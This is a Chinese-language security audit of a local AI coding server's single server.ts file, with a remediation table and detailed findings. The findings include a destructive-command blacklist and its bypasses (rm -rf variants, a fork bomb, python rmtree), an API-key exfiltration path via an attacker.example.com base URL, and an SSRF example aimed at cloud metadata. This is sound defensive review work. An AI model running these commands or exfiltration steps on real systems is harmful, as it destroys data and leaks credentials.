# ZCode server.ts 代码审查报告

> **归档说明**：本文写于项目改名前，是对**重构前**单文件 `server.ts`（约 950 行）的审计。
> 那次重构把所有能力拆进了 `src/agent/`，`server.ts` 现在只剩接入层。
>
> 两点阅读提示：
> 1. 本文的价值是记录「改之前有什么问题」，**不要把它当作当前代码的现状**；
>    下面的处置对照表是按当前代码逐条核对的。
> 2. 文中的文件、环境变量与目录名一律是旧称（`ZCODE_*` / `~/.zcode/`）。**有意保留原样** ——
>    把历史记录改成新名字，反而会让人以为当时就叫这个。

## 处置对照

| 编号 | 发现 | 现状 |
|---|---|---|
| S1 | 无鉴权 + 0.0.0.0 监听 → 远程 RCE | **已修**：默认只监听回环；非回环强制令牌（ADR-004） |
| S2 | API Key 可被引导泄露到任意 URL | **部分**：`/api/config/test` 仍接受请求体里的 apiBase+key。现在有令牌门禁 + Markdown 消毒，风险面收敛到「持令牌者」；未做 baseURL 白名单 |
| S3 | `/api/exec` 黑名单可绕过 → 任意命令执行 | **已修**：端点已删除（前端零调用）。命令执行统一走 agent 的 `bash` 工具，受审批策略与硬拒绝清单约束 |
| S4 | MCP SSRF：任意 URL 无校验 | **未修（有意）**：MCP 服务器本就是用户主动配置的地址，加白名单会破坏「连我自己的服务器」这一主用法。改为在审批卡片里标注工具来源，不做 URL 限制 |
| S5 | `safeResolve` 无 realpath → 符号链接逃逸 | **已修**：`assertNoSymlinkEscape` 对最深层已存在祖先做 realpath 校验，有测试 |
| S6 | delete fallback 用 shell 拼接路径 | **已修**：改用 `fs.cp`，不再拼 shell |
| S7 | `/api/config` 泄露 workspace 路径 | **接受**：本机应用，路径暴露给本机用户无实际影响 |
| S8 | MCP 接口打印原始 body | **已修**：日志行已移除 |
| C1 | 搜索对 grep 输出冒号解析错误 | **已修**：改为 Node 标准库遍历 + 结构化输出，有测试 |
| C2 | 替换搜索用正则、替换用字面串 | **已修**：两种模式语义统一，有测试 |
| C3 | SSE 错误/取消处理缺陷 | **已修**：改用 Vercel AI SDK 的 fullStream；`runAgent` 用 `finally` 只清理本次运行的待批请求 |
| C4 | `tc.index \|\| 0` 的 tool_calls 累积缺陷 | **已修**：增量合并交给 SDK |
| C5 | tool 循环 5 轮上限后静默丢弃 | **已修**：`stopWhen: stepCountIs(40)`，轮数体现在 step 事件上 |
| C6 | `runGit` 的 code 类型不一致 | **已修**：`simple-git` 统一为 `{code, stdout, stderr}` |
| C7 | git 分支名含 `\|` 时解析错乱 | **已修**：`for-each-ref` + `\x1f` 分隔符；实测含 `\|` 与 `:` 的 subject 正常 |
| C8 | `mcp::` 名称含 `::` 解析错乱 | **已修**：改名 `mcp__server__tool`（`::` 本就不是合法的 OpenAI 函数名字符），有测试 |
| X1 | 默认 WORKSPACE 在 Windows 解析错 | **已修**：`HOME` / `USERPROFILE` / `os.homedir()` 依次回退 |
| X2 | 无 grep 时搜索/替换静默失败 | **已修**：不再依赖 grep 二进制 |
| X3 | `find` 未加引号 + Windows 无 GNU find | **已修**：知识库改用工作区遍历，不再 shell 出去 |
| X4 | `/api/files` 在 Windows 返回反斜杠 | **已修**：路径统一转 `/` |
| R1 | `mcpCall` 无超时，聊天可永久挂起 | **已修**：换官方 SDK（自带超时与生命周期）；另加 SSE 心跳避免等审批时被中间层掐断 |
| R2 | `mcpInitialize` 重复注册竞态 | **已修**：`connect()` 先断旧连接再注册 |
| R3 | SSE buf 解析缺少最终 flush | **已修**：客户端与服务端两侧都有收尾处理，有测试 |

仍未做：**没有速率限制**。令牌是 256 位随机值，局域网场景下无法暴力枚举；若暴露到公网
（不建议）需要补限流层。

---

> 审查对象：`server.ts`（Hono + ws 本地开发服务器，约 950 行）
> 审查方式：只读。逐行阅读 + Node 24 实测 Windows 路径语义、黑名单绕过、冒号解析 + `where` 检查命令可用性。
> 目标平台：Termux/Android（Linux），但仓库在 Windows 上开发运行，故跨平台问题一并审查。

## 结论

存在 5 个必须修复的高危问题：

1. 无鉴权 + `0.0.0.0` 监听 → 局域网内任意远程代码执行 / 文件读写 / 终端访问；
2. `/api/chat/stream` 与 `/api/config/test` 会把服务端存储的 API Key 发送到客户端可控的 `apiBase` → 密钥泄露；
3. `/api/exec` 黑名单可被轻易绕过，本质是任意命令执行；
4. MCP 服务器 URL 无校验 → SSRF；
5. `safeResolve` 只做字符串前缀检查、不解析符号链接 → 可经工作区内符号链接逃逸读写任意文件。

另有正确性（搜索冒号解析、替换语义不一致、SSE 错误/取消处理）、跨平台（默认工作区路径、grep/find 缺失）、健壮性（MCP 无超时）等问题，详见下文。**不建议在修复前将该服务器暴露于不可信网络。**

## 验证方式说明

- 路径语义：`node -e` 模拟 `safeResolve`（Windows 实现），验证 `..`、绝对路径、`\\.\`/`\\?\` 前缀等输入。结果：`..` 被 `normalize` 折叠并被 `startsWith` 拦截；`path.join` 不会因绝对路径参数重置根目录（`join('C:\\work','C:\\Windows\\win.ini')` → `C:\\work\\C:\\Windows\\win.ini`）；`\\.\`/`\\?\` 不会被解析为设备路径。**字符串型目录穿越基本被挡，但符号链接未检查。**
- 黑名单绕过：实测 `rm -rf "/"`、`rm -fr /`、`:(){ :|:& };:` 均不命中 `includes` 黑名单。
- 冒号解析：实测 `./a:b.txt:3:content` 被解析为 `{path:'./a', line:NaN, text:'3:content'}`；`Binary file ./x.png matches` 产生垃圾结果。
- 命令可用性：`where grep`/`cp`/`rm` 无结果；`where git` 存在（Git for Windows）；`where find` 为 `C:\Windows\System32\find.exe`（非 GNU find）。

## 发现汇总表

| # | 类别 | 严重级别 | 问题 | 关键证据位置 |
|---|------|---------|------|------------|
| S1 | 安全 | 高 | 无鉴权 + 0.0.0.0 监听 → 远程 RCE/文件读写/终端 | L940, L843-861, L870-878 |
| S2 | 安全 | 高 | API Key 可被引导泄露到任意 URL | L654-657, L694-699, L500-510 |
| S3 | 安全 | 高 | /api/exec 黑名单可绕过，任意命令执行 | L848-851 |
| S4 | 安全 | 高 | MCP SSRF：任意 URL 无校验 | L109-118, L537-550 |
| S5 | 安全 | 高 | safeResolve 无 realpath，符号链接逃逸 | L181-185 |
| S6 | 安全 | 中 | /api/delete fallback shell 拼接注入 + Windows 无 cp/rm | L260 |
| S7 | 安全 | 低 | /api/config 泄露 workspace 路径；掩码逻辑歧义 | L479-495 |
| S8 | 安全 | 低 | /api/mcp/servers 日志打印原始 body | L541 |
| C1 | 正确性 | 中 | /api/search 冒号解析错误 | L279-287 |
| C2 | 正确性 | 中 | /api/replace 搜索用正则、替换用字面串，语义不一致 | L299-307, L65 |
| C3 | 正确性 | 中 | SSE 错误/取消处理缺陷 | L703-705, L713-715, L822-827 |
| C4 | 正确性 | 低 | tc.index \|\| 0 的 tool_calls 累积缺陷 | L739 |
| C5 | 正确性 | 低 | tool 循环 5 轮上限后静默丢弃 | L761-762, L816-823 |
| C6 | 正确性 | 低 | runGit 的 code 类型不一致 | L325 |
| C7 | 正确性 | 低 | git 分支名含 \| 时解析错乱 | L366-372 |
| C8 | 正确性 | 低 | mcp:: 名称含 :: 解析错乱 | L784-789 |
| X1 | 跨平台 | 中 | 默认 WORKSPACE 在 Windows 解析到 C:\data\... | L38-40 |
| X2 | 跨平台 | 中 | grep 缺失时搜索/替换静默失败 | L55, L58, L65, L68 |
| X3 | 跨平台 | 中 | find 命令未加引号 + Windows 无 GNU find | L586 |
| X4 | 跨平台 | 低 | /api/files 返回反斜杠路径 | L197 |
| R1 | 健壮性 | 中 | mcpCall 无超时，聊天流可永久挂起 | L109-118, L796 |
| R2 | 健壮性 | 低 | mcpInitialize 重复注册/竞态 | L545-548, L662-671 |
| R3 | 健壮性 | 低 | SSE buf 解析缺少最终 flush | L716 |

## 安全问题

### S1 [高] 无鉴权 + 0.0.0.0 监听 → 远程任意代码执行与数据泄露

- **位置**：L940；`/api/exec` L843-861；`/ws/terminal` L868-886、L949。
- **证据**：
  - `L940: serve({ fetch: app.fetch, port: PORT, hostname: "0.0.0.0" }, ...)`
  - `L853-857: await execAsync(command, { cwd: WORKSPACE, timeout: 60_000, maxBuffer: 10 * 1024 * 1024 });`
  - `L870-878: wss.on("connection", ...)` 直接 `PTY.spawn(shell, [], ...)`，无鉴权。
- **影响**：任何能访问该端口的主机（LAN 内其他设备、Android 上同一网络的其他设备）都可以：执行任意 shell 命令、读写/删除工作区全部文件、打开交互式终端、操作 git、消耗上游 API 额度。控制台只打印 `http://localhost:${PORT}`（L944），容易让使用者误以为仅本机可达。
- **修复方向**：默认监听 `127.0.0.1`/`::1`，或加 token 鉴权（启动时生成随机 token，所有 `/api/*` 与 `/ws/*` 校验），`0.0.0.0` 改为显式配置且默认关闭。

### S2 [高] API Key 可被引导泄露到任意 URL

- **位置**：L654-657（`/api/chat/stream` 合并配置）；L694-699（携带存储 key 的上游请求）；L500-510（`/api/config/test`）。
- **证据**：
  - `L654-657: const cfg = { ...serverConfig }; if (body.apiKey) cfg.apiKey = body.apiKey; if (body.apiBase) cfg.apiBase = body.apiBase.replace(/\/+$/, "");`
  - `L694-699: const resp = await fetch(\`${cfg.apiBase}/chat/completions\`, { method: "POST", headers: { "Content-Type": "application/json", Authorization: \`Bearer ${cfg.apiKey}\` }, ... })`
  - `L500-510:` `base` 默认取 `serverConfig.apiBase`，`key` 默认取 `serverConfig.apiKey`，随后向 `${base}/chat/completions` 发送 `Bearer ${key}`。
- **影响**：由于所有接口无鉴权，攻击者直接 POST `/api/chat/stream`，body 只带 `apiBase: "https://attacker.example.com"`（不带 apiKey），服务器会用存储的真实 key 向攻击者 URL 发送 `Authorization: Bearer <key>`，密钥即被窃取。`/api/config/test` 同理。这是最直接的凭据泄露通道。
- **修复方向**：客户端不能任意覆盖 `apiBase`；当客户端未提供 apiKey 时拒绝使用自定义 apiBase；对 `apiBase` 做域名 allowlist；`/api/config` 与 `/api/config/test` 需要鉴权。

### S3 [高] `/api/exec` 黑名单可绕过，本质是任意命令执行

- **位置**：L848-851（黑名单）、L853-857（执行）。
- **证据**：`const blocked = ['rm -rf /', 'mkfs', 'dd if=/dev/zero', ':(){:|:&};:', '> /dev/sda'];` 使用 `command.includes(b)` 子串匹配。实测绕过：`rm -rf "/"`（引号断开子串）、`rm -fr /`（参数顺序不同）、`:(){ :|:& };:`（空格）均不命中；`python3 -c 'import shutil; shutil.rmtree("/")'` 等任意等价命令也不受限制。
- **影响**：黑名单是摆设，`/api/exec` 本身就是任意 shell 执行。与 S1 叠加即远程 RCE。
- **修复方向**：该 API 无法靠黑名单加固。要么移除，要么加鉴权 + 命令 allowlist；需要命令执行时改为参数化专用接口（git/文件操作已覆盖）。

### S4 [高] MCP SSRF：任意 URL 无校验

- **位置**：`mcpCall` L109-118；`/api/mcp/servers` L537-550；`/api/chat/stream` L662-670；`/api/mcp/reload` L566-572。
- **证据**：`L110: const res = await fetch(serverUrl, { method: 'POST', ... })`，`serverUrl` 完全由客户端 POST 提供（`L542: name = parsed.name; url = parsed.url`），无协议/域名/私网 IP 校验。注册后立即后台调用 `mcpInitialize`（L548）→ 对任意 URL 发起 JSON-RPC POST（initialize / tools/list）。
- **影响**：攻击者可让服务器向任意内网地址/云元数据（如 `http://169.254.169.254/latest/meta-data/`）发送 POST，造成内网探测、元数据访问；也可借 `tools/call` 向任意 URL 发送带攻击者指定内容的 POST。无鉴权下 LAN 内任意人都可触发。
- **修复方向**：校验 `serverUrl` 必须为 `http(s)`，禁止 localhost/私网/链路本地地址（或默认仅允许公网 URL，内网地址需显式确认）；`mcpCall` 加超时。

### S5 [高] `safeResolve` 不做 realpath，符号链接逃逸

- **位置**：L181-185 `safeResolve`；使用处 L208（读）、L219/L231（写）、L245（删）、L303（替换）。
- **证据**：
  - `L182-183: const full = normalize(join(WORKSPACE, relativePath)); if (!full.startsWith(WORKSPACE + sep) && full !== WORKSPACE) throw new Error("路径越界");`
  - 只做字符串规范化与前缀比较，没有 `realpath`/`lstat` 解析符号链接。已实测：`..` 穿越、绝对路径、`\\.\`/`\\?\` 前缀均被拦截；但若工作区内存在指向外部的符号链接 / Windows junction（用户项目常见，攻击者也可经终端创建），`readFile`/`writeFile`/`readdir` 会跟随链接，目标实际在工作区外。
- **影响**：工作区边界被绕过，可读取/覆盖服务器用户可访问的任意文件（如 `~/.ssh/*`、`/etc/passwd` 等）。
- **修复方向**：对已存在路径，用 `realpath` 解析后再次校验前缀；写路径先 `lstat` 拒绝符号链接；或对读目录项做 `lstat` 不跟随。

### S6 [中] `/api/delete` fallback 用 shell 拼接路径，可注入

- **位置**：L260。
- **证据**：`exec(\`cp -r "${full}" "${trashPath}" 2>/dev/null && rm -rf "${full}"\`, ...)`。`full` 来自 `safeResolve(rel)`；Unix 文件名可含 `"` 或 `$()`/反引号（合法），当 `rename` 因跨设备（EXDEV）失败进入 fallback 时，拼接字符串会被 shell 解释。另外实测 Windows 上 `cp`/`rm` 不存在，fallback 在 Windows 必然失败。
- **影响**：触发条件下可命令注入；Windows 上删除静默失败。
- **修复方向**：改用 `execFile("cp", ["-r", full, trashPath])` / `execFile("rm", ["-rf", full])` 参数数组，或直接用 Node 的 `fs.promises.cp`/`rm`。

### S7 [低] `/api/config` 掩码逻辑本身无泄露，但泄露 workspace 路径且存在 `***` 歧义

- **位置**：L479-495。
- **证据**：GET 返回 `apiKey: serverConfig.apiKey ? "***" : ""`（L481）；POST 仅当 `body.apiKey !== "***"` 才更新（L491）。POST 回 `***` 不会修改 key——掩码逻辑正确、无直接泄露。但 GET 返回 `workspace: WORKSPACE`（L484），暴露服务器绝对路径；且若真实 key 恰为字面 `"***"`，将无法通过 POST 修改/清除。
- **影响**：信息泄露（绝对路径）；极端情况 key 无法管理。真正的泄露风险是 S2（无鉴权时可改 apiBase）。
- **修复方向**：GET 不返回 `workspace`；用布尔字段区分"已配置"与"key 为 ***"；`/api/config` 加鉴权。

### S8 [低] `/api/mcp/servers` 日志打印原始 body

- **位置**：L541 `console.log("[mcp] raw body:", JSON.stringify(raw))`。
- **影响**：若用户把带凭据的 URL（如 `https://user:token@host`）注册为 MCP 服务器，凭据会出现在 stdout 日志中。
- **修复方向**：只打印 `name`，不打印完整 `url`。

## 正确性问题

### C1 [中] `/api/search` 对 grep 输出的冒号解析错误

- **位置**：L279-287。
- **证据**：`L280-285: const colonIdx = line.indexOf(":"); ... const lineNum = parseInt(rest.slice(0, lineNumEnd), 10); ...`。实测 `./a:b.txt:3:content`（Unix 文件名含冒号合法）被解析为 `{path:'./a', line:NaN, text:'3:content'}`；`Binary file ./x.png matches`（grep 对二进制文件的输出，无冒号）产生 `{path:'Binary file ./x.png matche', line:NaN, text:'Binary file ./x.png matches'}` 的垃圾结果。
- **影响**：文件名含冒号时搜索结果路径错误、行号 NaN，点击跳转会打开错误文件；二进制文件噪声会占用前 200 条结果配额。
- **关于 Windows 盘符**：`_grepFiles` 以 `.` 为搜索路径（L55），grep 输出为相对路径（`./...`），一般不出现盘符冒号；但一旦 grep 输出绝对路径，或文件名本身含冒号，解析即坏。目标平台 Termux/Linux 上文件名含冒号合法，该 bug 真实存在。
- **修复方向**：从行尾反向解析（`lastIndexOf(":")` 定位 text 起点，再向前找行号）；或使用 `grep -rZ`/`--null` 以 `\0` 分隔路径，彻底规避冒号歧义。

### C2 [中] `/api/replace` 搜索用正则、替换用字面串，语义不一致

- **位置**：L299（grep 正则匹配文件）、L307（字面替换）。
- **证据**：`L299: const files = await _grepFilesList(pattern, ext);` 中 `grep -rl pattern .` 把 `pattern` 当 BRE 正则；而 `L307: const newContent = content.split(pattern).join(replacement || "");` 是字面子串替换。例如输入 `foo.*bar` 或 `a.c`：grep 匹配大量文件，但字面字符串可能不存在 → `filesAffected=0`；UI 用搜索结果数（正则匹配）提示"匹配文件：N 个结果"（`ui/src/components/SearchPanel.tsx`），随后替换 0 个文件，误导用户。
- **影响**：批量替换结果与搜索提示不一致，用户以为替换成功实际未生效；反之亦然。
- **修复方向**：统一语义——用 `grep -F`/`--fixed-strings` 让 grep 也做字面匹配，或把替换改为正则并处理转义。

### C3 [中] SSE 流的错误与取消处理缺陷

- **位置**：L703-705、L713-715、L754-827。
- **证据**：
  - 上游非 200 时 `controller.error(new Error(...))`（L704），流直接进入 errored 状态；随后外层仍执行 `L822: controller.enqueue("data: [DONE]\n\n")` 与 `L823: controller.close()`——对已 error 的流 `enqueue` 会抛 `TypeError`，被 `L824 catch` 捕获后再 `L825: controller.enqueue("event: error...")` 再次抛异常且无人接住 → 客户端**收不到 error 事件**，只看到流异常中断。
  - 没有把客户端断开（`req.signal` / Response 的 cancel）接到上游 fetch：客户端断开后 `reader.read()` 仍继续读取上游直到完成，token 继续消耗，且 `controller.enqueue` 抛出的异常同样进入上述未处理路径。
- **影响**：错误事件无法送达客户端；客户端断线不中止上游请求（额外费用）；存在未捕获异常路径。
- **修复方向**：用 `AbortController` 绑定请求取消与上游 fetch；错误路径统一走 `event: error` + `[DONE]`，不调用 `controller.error()`；对 `enqueue` 包 try/catch。

### C4 [低] `tc.index || 0` 的 tool_calls 增量累积缺陷

- **位置**：L739-743。
- **证据**：`L739: const idx = tc.index || 0;`——`||` 把"缺失 index"与"index=0"混为一谈。当 provider 在多个 tool call 交错的增量中省略 `index`（部分 OpenAI 兼容服务会省略），所有增量合并进槽 0，两个 tool call 的 `arguments` 会串在一起、`id` 互相覆盖。`0 || 0 === 0` 不误伤 index=0，但缺失 index 时行为错误。
- **修复方向**：`const idx = tc.index ?? toolCallsState.length;`，对缺失 index 的增量按已有槽位累计。

### C5 [低] tool 循环达到 5 轮上限后静默丢弃

- **位置**：L761-762；L816-823。
- **证据**：`while (toolCalls.length > 0 && safety-- > 0)`（初始 5 轮）；若模型连续 5 轮都请求 tool call，循环退出时最后的 `toolCalls` 非空但被丢弃，未追加 assistant/tool 消息，也没有 error 事件，客户端直接收到 `[DONE]`（L822）。
- **影响**：对话被静默截断，用户以为完成，实际最后几轮工具结果未发送。
- **修复方向**：达到上限时发送 `event: error`（如"工具调用超过 5 轮"），并保留最后一轮 assistant 消息。

### C6 [低] `runGit` 的 code 类型不一致

- **位置**：L325。
- **证据**：`res({ code: err ? (err as NodeJS.ErrnoException & { code?: number }).code ?? 1 : 0, ... })`。`execFile` 回调中，git 非零退出时 `err.code` 是数字（退出码）；git 不存在时 `err.code === 'ENOENT'`（字符串），超时被杀时 `err.code` 为 `null`。`?? 1` 使 `'ENOENT'` 原样作为 `code` 返回，前端按数字展示（`ui/src/components/GitPanel.tsx` 直接展示 `code`）。
- **修复方向**：统一为数字：`typeof err.code === 'number' ? err.code : 1`。

### C7 [低] git 分支名含 `|` 时解析错乱

- **位置**：L366-372。
- **证据**：`git for-each-ref --format="%(refname:short)|%(HEAD)|..."`（L367）后用 `line.split("|")`（L371）。git refname 允许 `|`；分支名 `feat|foo` 会被拆开，`name` 变成 `feat`，`subject` 整体错位。
- **修复方向**：字段分隔改用控制字符（如 `\x00` 或 `%09`），或对 `|` 转义。

### C8 [低] `mcp::server::tool` 解析在名称含 `::` 时错乱

- **位置**：L784-789。
- **证据**：`rest.indexOf('::')` 取第一个 `::`；若服务器名或工具名本身含 `::`（服务器名用户可自定义），解析出的 server/tool 与注册名不符，工具调用返回"未找到服务器"。
- **修复方向**：注册时限制名称不允许含 `::`，或在文档中明确约束。

## 跨平台问题

### X1 [中] 默认 WORKSPACE 在 Windows 上解析到 `C:\data\data\com.termux\...`

- **位置**：L38-40。
- **证据**：`join(process.env.HOME || "/data/data/com.termux/files/home", ".zcode", "workspace")`。实测本机（Windows，`HOME` 未设置）：`path.win32.resolve(join('/data/data/com.termux/files/home', '.zcode', 'workspace'))` = `C:\data\data\com.termux\files\home\.zcode\workspace`。
- **影响**：Windows 上未设置 `ZCODE_WORKSPACE` 时，启动会在 `C:\data` 下建目录（通常无权限），`startup()` 的 `mkdir` 失败 → 进程退出，服务器无法启动。
- **修复方向**：Windows 上回退到 `USERPROFILE`，或用 `os.homedir()` 替代硬编码 Termux 路径。

### X2 [中] `grep` 在 Windows 不存在时，搜索/替换静默失败

- **位置**：L55、L58、L65、L68。
- **证据**：`execFile("grep", ...)`，回调 `resolve(stdout || "")` / `resolve((stdout || "").trim().split(...))` 均忽略 `err`。实测本机 `where grep` 无结果。grep 不存在 → `stdout` 为空 → `/api/search` 永远返回空数组、`/api/replace` 永远 0 文件，且不报错。
- **影响**：Windows 用户得到"没有匹配结果 / 替换 0 个文件"的错误假象。
- **修复方向**：检测 grep 不可用时返回明确错误；或内置纯 JS 搜索（`fs.walk` + 内容匹配），摆脱对 grep 的依赖。

### X3 [中] `/api/knowledge/generate` 的 `find` 命令未加引号，且 Windows 上无 GNU find

- **位置**：L586。
- **证据**：`execAsync(\`find ${WORKSPACE} -maxdepth 3 -not -path '*/.git/*' -not -path '*/node_modules/*' | head -100\`, ...)`。`${WORKSPACE}` 未加引号：路径含空格时 `find` 收到多个参数，命令失败。Windows 上 `find` 是 `C:\Windows\System32\find.exe`（行过滤工具，语法完全不同），命令必然失败。错误被 L643-645 捕获后返回"生成失败"文档，功能不可用。
- **修复方向**：用 `execFile("find", [WORKSPACE, "-maxdepth", "3", ...])` 参数数组，并做平台回退（Windows 用 Node 遍历目录）。

### X4 [低] `/api/files` 返回的路径在 Windows 上为反斜杠

- **位置**：L197 `path: join(rel === "." ? "" : rel, e.name)`。
- **影响**：前端展示与后续请求都带 `\`（如 `sub\file.txt`）。`safeResolve` 能处理所以功能可用，但与 web UI 的 `/` 约定不一致。
- **修复方向**：统一转换为 `/`：`join(...).replace(/\\/g, "/")`。

## 健壮性问题

### R1 [中] `mcpCall` 无超时，聊天流可永久挂起

- **位置**：L109-118（fetch 无 signal/超时）；L796（工具调用在 SSE `start` 内同步等待）。
- **证据**：MCP 服务器不响应时 `await fetch(serverUrl)` 挂起；由于 L796 在 `ReadableStream.start` 中等待，整个 SSE 聊天流既不输出也不结束。`mcpInitialize` 的后台请求同样永久挂起，造成连接/内存泄漏。
- **修复方向**：给 `mcpCall` 加 `AbortController` + 超时（如 15s），超时返回工具错误。

### R2 [低] `mcpInitialize` 重复注册/竞态

- **位置**：L545-548、L662-671。
- **证据**：同名服务器重复 POST 时 `mcpRegistry.set(name, server)` 替换旧对象，但旧 `mcpInitialize(server)` 完成后把 `tools` 写回旧的 server 对象（已不在 registry 中），新对象可能永远没有 tools。注册后立即聊天时 `mcpToolsToOpenAI()` 可能拿到空工具列表。
- **修复方向**：以 name 为 key 去重（初始化进行中则复用同一 Promise），完成后写回 registry 中的当前对象。

### R3 [低] SSE buf 解析缺少最终 flush

- **位置**：L716。
- **证据**：`buf += decoder.decode(value, { stream: true });` 循环结束后从未调用 `decoder.decode()`。若最后一个 SSE 事件跨 chunk 边界的多字节字符被截断，末尾字符丢失；由于 JSON.parse 失败被静默吞掉（L747），实际影响很小。
- **修复方向**：循环结束后 `buf += decoder.decode();` 再处理残留。

## 未覆盖 / 未能验证的项

- 未实际启动服务器（本机缺少 grep 且审查要求只读，避免写入工作区）。符号链接逃逸未做磁盘实测（需要创建符号链接），依据为代码逻辑与 Node 路径语义实测。
- 未验证真实上游 LLM（OpenAI/兼容服务）的 SSE 增量字段（`index`、`reasoning_content` 等）与代码假设是否一致。
- 未审查 `ui/` 前端全部代码；仅检查了 `api.ts`/`store.ts`/`SearchPanel.tsx`/`GitPanel.tsx`/`SettingsModal.tsx` 中与本报告相关的调用。
- `node-pty` 在 Windows 上的实际终端行为未验证（依赖原生编译）。